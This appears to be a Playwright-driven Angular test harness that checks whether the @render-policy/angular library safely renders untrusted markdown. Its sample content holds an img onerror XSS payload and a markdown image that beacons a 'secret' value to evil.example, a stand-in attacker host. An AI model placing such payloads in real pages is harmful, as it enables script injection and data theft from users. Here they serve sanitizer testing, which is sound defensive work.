/**
 * A minimal standalone Angular application over the built FESM bundle of
 * @render-policy/angular. It is compiled at runtime (JIT through @angular/compiler,
 * which links the partial declarations) and driven from Playwright in run.mjs.
 */
import '@angular/compiler';
import { Component, provideZonelessChangeDetection, signal } from '@angular/core';
import { bootstrapApplication } from '@angular/platform-browser';
import { RpMarkdownComponent, RpRenderDirective, provideRenderPolicy } from '@render-policy/angular';

declare global {
  interface Window {
    __angularReady?: boolean;
    __pwned?: unknown;
    __cspViolations: string[];
    __innerHTMLWritesInApp: string[];
    __decisions: unknown[];
    __app: {
      setContent(value: string): void;
      setStream(value: string): void;
      setStreaming(value: boolean): void;
      tick(): void;
    };
  }
}

window.__cspViolations = [];
document.addEventListener('securitypolicyviolation', (event) => {
  window.__cspViolations.push(`${event.violatedDirective}: ${event.sample || event.blockedURI}`);
});

// Record every innerHTML write that targets the application's own subtree.
window.__innerHTMLWritesInApp = [];
const descriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
if (descriptor?.set) {
  const originalSet = descriptor.set;
  Object.defineProperty(Element.prototype, 'innerHTML', {
    ...descriptor,
    set(this: Element, value: string) {
      if (this.closest('app-root')) window.__innerHTMLWritesInApp.push(this.tagName.toLowerCase());
      originalSet.call(this, value);
    },
  });
}

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [RpMarkdownComponent, RpRenderDirective],
  template: `
    <section>
      <h2>Directive</h2>
      <div id="directive" [rpRender]="content()"></div>
    </section>
    <section>
      <h2>Component, streaming</h2>
      <rp-markdown id="component" [content]="streamText()" [streaming]="streaming()" />
    </section>
  `,
})
class AppComponent {
  readonly content = signal(
    '# Hello\n\n<img src="/nonexistent.png" onerror="window.__pwned = true"> ![remote](https://evil.example/leak.png?c=secret)\n\n<form><input type="password"></form>',
  );
  readonly streamText = signal('');
  readonly streaming = signal(true);
}

window.__decisions = [];
const appRef = await bootstrapApplication(AppComponent, {
  providers: [
    provideZonelessChangeDetection(),
    provideRenderPolicy({ mode: 'balanced', onDecision: (decision) => window.__decisions.push(decision) }),
  ],
});
const app = appRef.components[0]?.instance as AppComponent;

window.__app = {
  setContent: (value) => app.content.set(value),
  setStream: (value) => app.streamText.set(value),
  setStreaming: (value) => app.streaming.set(value),
  tick: () => appRef.tick(),
};
window.__angularReady = true;
